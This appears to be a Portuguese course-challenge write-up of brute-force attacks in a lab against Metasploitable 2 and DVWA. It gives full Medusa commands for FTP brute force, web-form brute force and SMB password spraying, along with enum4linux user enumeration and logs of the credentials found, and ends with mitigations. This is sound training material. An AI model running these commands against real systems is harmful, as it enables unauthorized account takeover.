# Desafio de Projeto DIO — Brute Force com Kali e Medusa

> Projeto do desafio de cibersegurança da DIO: simular ataques de **força bruta** em um laboratório virtual usando **Kali Linux** e **Medusa**. (Ambiente controlado: Metasploitable 2 e DVWA.)

---

## 1. Ambiente do laboratório
- **Virtualizador:** VirtualBox  
- **Rede:** Host‑Only (rede interna)  
- **Atacante:** Kali Linux  
- **Alvos:** Metasploitable 2 e DVWA

---

## 2. Ataques realizados

### Cenário 1 — Ataque FTP (Metasploitable 2)
- **Alvo:** `192.168.56.102`  
- **Listas usadas:** `user.txt`, `senhas.txt`

**Comando:**
```bash
medusa -h 192.168.56.102 -U user.txt -P senhas.txt -M ftp
```

**Trecho do resultado:**
```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
2025-10-24 23:19:10 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 comp ...)
2025-10-24 23:19:25 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-24 23:19:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 ... User: user ... Password: msfadmin ...
```

> ✅ **Resultado:** Funcionou — credenciais `msfadmin:msfadmin` encontradas.

---

### Cenário 2 — Ataque de formulário web (DVWA)
- **Alvo:** `192.168.56.102`  
- **Nível do DVWA:** Low

**Comando (exemplo com parâmetros de formulário):**
```bash
medusa -h 192.168.56.102 -U user.txt -P senhas.txt -M web-form   -m FORM_TARGET:"/dvwa/vulnerabilities/brute/index.php"   -m FORM_DATA:"username=%USER%&password=%PASS%&Login=Login"   -m FORM_FAIL:"Username and/or password incorrect."   -m PAGE_LOGIN_PATH:"/dvwa/login.php"   -m PAGE_LOGIN_DATA:"username=admin&password=password&Login=Login"
```

**Trecho do resultado:**
```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
WARNING: Invalid method: FORM_TARGET.
2025-10-24 23:30:52 ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: msfadmin Password: admin [SUCCESS]
2025-10-24 23:30:52 ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: admin [SUCCESS]
2025-10-24 23:30:52 ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: user Password: admin [SUCCESS]
```

> ✅ **Resultado:** Funcionou — várias combinações encontradas (ex.: `msfadmin:admin`).

---

### Cenário 3 — Password spraying em SMB (Metasploitable 2)
- **Alvo:** `192.168.56.102`  
- **Técnica:** testar uma mesma senha (`msfadmin`) em vários usuários (spraying).

**Enumeração de usuários (com `enum4linux`):**
```bash
enum4linux -U 192.168.56.102
```

**Exemplo de saída (usuários encontrados):**
```
user:[user] rid:[0xbba]
user:[root] rid:[0x3e8]
user:[msfadmin] rid:[0xbb8]
...
enum4linux complete on Fri Oct 24 23:22:32 2025
```

**Comando (password spraying):**
```bash
medusa -h 192.168.56.102 -U user.txt -p 'msfadmin' -M smbnt
```

**Trecho do resultado:**
```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
2025-10-24 23:26:31 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2025-10-24 23:26:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 ... User: admin ... Password: msfadmin ...
```

> ✅ **Resultado:** Achou `msfadmin` com acesso administrativo (`ADMIN$`).

---

## 3. Mitigações — Como se proteger
Principais recomendações para reduzir o risco de ataques de força bruta:

- Usar **senhas fortes** e únicas.  
- Bloquear/lockar contas após X tentativas falhas.  
- Implementar **rate limiting** (atraso entre tentativas).  
- Adotar **Autenticação Multifator (MFA)**.  
- Monitorar logs e alertas de tentativas de login suspeitas.  
- Desativar serviços desnecessários (ex.: FTP, SMB) quando não usados.

---

## 4. Aviso legal
Todos os testes foram realizados **em ambiente virtual e controlado** (Metasploitable 2 e DVWA) apenas para fins de aprendizado. **Nenhum sistema real foi atacado.**

---

## Apêndice — Sumário rápido
- **Ambiente:** VirtualBox (Host‑Only), Kali, Metasploitable 2, DVWA.  
- **Ferramenta principal:** Medusa (v2.3).  
- **Técnicas usadas:** brute‑force em FTP, brute‑force via formulário web, password spraying em SMB.  
- **Data das execuções (logs):** 24 de outubro de 2025 (horários aparecem nos trechos de log).

---
